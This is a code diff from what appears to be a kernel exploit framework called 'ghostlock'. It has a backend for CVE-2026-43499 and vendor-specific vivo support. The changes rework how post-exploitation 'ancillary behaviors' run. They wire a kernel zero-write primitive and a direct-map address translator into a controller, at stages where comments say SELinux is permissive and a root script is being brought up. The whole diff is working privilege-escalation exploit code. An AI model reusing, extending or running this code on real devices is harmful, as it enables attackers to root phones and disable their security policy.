@@ -16,10 +16,24 @@
 
 #include "backend/cve_2026_43499/route/route_policy.hpp"
 #include "platform/runtime.hpp"
-#include "common.h"
+#ifndef _GNU_SOURCE
+#define _GNU_SOURCE
+#endif
+
+#include "memory/offset.h"
+#include "kernelsnitch/utils.h"
+#include "profile/runtime_struct_offsets.h"
+#include "backend/cve_2026_43499/backend_profile/accessors.hpp"
+#include "support/timing.hpp"
+
+#include <signal.h>
+#include <sys/wait.h>
+
 #include "memory/direct_map.hpp"
 #include "memory/target.h"
-#include "ancillary/ancillary_controller.hpp"
+#include "ancillary/controller.hpp"
+#include "platform/vivo/registry.hpp"
+#include "platform/vivo/schema.hpp"
 #include "backend/victim/victim_process.hpp"
 #include "support/decls.hpp"
 #include "support/run_state.hpp"
@@ -27,6 +41,7 @@
 #include <unistd.h>
 
 #include <cstdint>
+#include <tuple>
 #include <utility>
 
 namespace ghostlock::backend {
@@ -37,6 +52,16 @@ namespace ghostlock::backend {
     using ghostlock::session::StageResult;
     using ghostlock::session::VictimChain;
     namespace {
+        /* Injected image->direct-map translation for the vendor behaviors.
+         * Like Cve43499Primitives::zero_word it binds the session global, so the
+         * neutral AncillaryOps carries a plain function pointer and
+         * platform::vivo never names a backend type. */
+        uintptr_t image_to_direct_map(uintptr_t image_addr) noexcept {
+            return ghostlock::backend::cve43499_state(
+                       ghostlock::session::g_exploit_session)
+                    .addresses.data_alias(image_addr);
+        }
+
         /* Shared write/retry sequence. */
         template <class M>
         Status retry_write_stage(
@@ -151,15 +176,23 @@ namespace ghostlock::backend {
              * child's getuid(). */
             support::run_state::enter("w2b");
             {
-                ancillary::AncillaryContext ancillary_context{
+                const platform::vivo::View ancillary_view =
+                        platform::vivo::make_view(
+                            ghostlock::backend::cve43499_state(session).profile);
+                ancillary::AncillaryOps ancillary_ops{
                     .write_available = true,
                     .read_available = false,
                     .write_zero = &Cve43499Primitives::template zero_word<M>,
+                    .image_to_direct_map = &image_to_direct_map,
                     .child_task = child_task,
                 };
-                if (!ancillary::AncillaryController<M>::apply(
+                const auto ancillary_enabled = [&ancillary_view]<class P>() {
+                    return P::enabled(ancillary_view);
+                };
+                if (!ancillary::AncillaryController<
+                            platform::vivo::VivoAncillaryPolicies>::apply<M>(
                             ancillary::AncillaryStage::PostSpawn, session,
-                            ancillary_context)) {
+                            ancillary_ops, ancillary_enabled, ancillary_view)) {
                     pr_warning("ancillary: post-spawn behavior reported failure; "
                                "continuing\n");
                 }
@@ -367,20 +400,29 @@ namespace ghostlock::backend {
                 support::run_state::complete("w1a");
                 support::run_state::complete("w1b");
             }
-            /* Ancillary behaviors run outside the exploit path. The call site is
-             * fixed: adding a behavior changes the registry, never this block.
-             * PreSpawn = SELinux is permissive and no victim exists yet, so one
-             * write covers everything the run brings up, the root script's ksud
-             * included. */
+            /* Ancillary behaviors run outside the exploit path. The caller
+             * injects the registry (platform::vivo::VivoAncillaryPolicies), the
+             * view and the gate (the profile's vr.ko support), so the neutral
+             * controller knows neither backend nor profile. PreSpawn = SELinux is
+             * permissive and no victim exists yet, so one write covers everything
+             * the run brings up, the root script's ksud included. */
             {
-                ancillary::AncillaryContext ancillary_context{
+                const platform::vivo::View ancillary_view =
+                        platform::vivo::make_view(
+                            ghostlock::backend::cve43499_state(session).profile);
+                ancillary::AncillaryOps ancillary_ops{
                     .write_available = true,
                     .read_available = false,
                     .write_zero = &Cve43499Primitives::template zero_word<M>,
+                    .image_to_direct_map = &image_to_direct_map,
                 };
-                if (!ancillary::AncillaryController<M>::apply(
+                const auto ancillary_enabled = [&ancillary_view]<class P>() {
+                    return P::enabled(ancillary_view);
+                };
+                if (!ancillary::AncillaryController<
+                            platform::vivo::VivoAncillaryPolicies>::apply<M>(
                             ancillary::AncillaryStage::PreSpawn, session,
-                            ancillary_context)) {
+                            ancillary_ops, ancillary_enabled, ancillary_view)) {
                     pr_warning("ancillary: pre-spawn behavior reported failure; "
                                "continuing\n");
                 }
